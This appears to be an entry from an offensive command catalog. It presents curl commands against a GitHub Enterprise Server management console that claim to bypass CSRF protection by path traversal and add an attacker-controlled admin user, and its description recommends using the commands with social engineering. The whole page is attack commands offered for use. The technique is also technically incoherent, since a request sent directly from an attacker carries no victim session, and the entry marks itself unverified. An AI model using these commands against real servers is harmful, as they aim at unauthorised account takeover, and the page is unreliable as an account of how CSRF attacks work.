---
data: >-
  curl -X POST 'https://<ghes-host>/manage/settings' -H 'Content-Type:
  application/x-www-form-urlencoded' -H 'Referer: https://attacker-site.com' -d
  'csrf_path=../../../bypass&action=add_user&user=attacker&role=admin'
tags:
  - web-exploit
  - csrf
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:57.869Z'
id: cf2d34a4-caaf-468d-9b61-042daf1d90f8
verified: false
validated: true
submitted: true
---
# curl-csrf-bypass

## Command

```bash
curl -X POST 'https://<ghes-host>/manage/settings' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Referer: https://attacker-site.com' \
  -d 'csrf_path=../../../bypass&action=add_user&user=attacker&role=admin'
```

## Description

This curl command sends a POST request to the GitHub Enterprise Server management console, using path traversal in the 'csrf_path' parameter to bypass CSRF protections and perform a privileged action like adding an admin user. Use it when targeting logged-in sessions via social engineering.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP method | Yes |
| `'https://<ghes-host>/manage/settings'` | Target endpoint URL | Yes |
| `-H 'Content-Type: ...'` | Sets form data type | Yes |
| `-H 'Referer: ...'` | Fakes origin to mimic cross-site request | Yes |
| `-d 'csrf_path=...'` | Path traversal payload to bypass CSRF | Yes |
| `-d 'action=...'` | Action to perform (e.g., add_user) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://ghes.example.com/manage/settings' -d 'csrf_path=../../../bypass&action=update'
```

### Advanced Usage

```bash
curl -X POST 'https://ghes.example.com/manage/users' \
  -H 'Cookie: session=admin_session' \
  -d 'csrf_path=../../etc/bypass&user=newadmin&role=super'
```

## Expected Output

HTTP 200 OK with body indicating successful action (e.g., "User added successfully"), without CSRF token errors. Failure shows 403 or CSRF validation message.

## Related

- [[Related Procedure]]
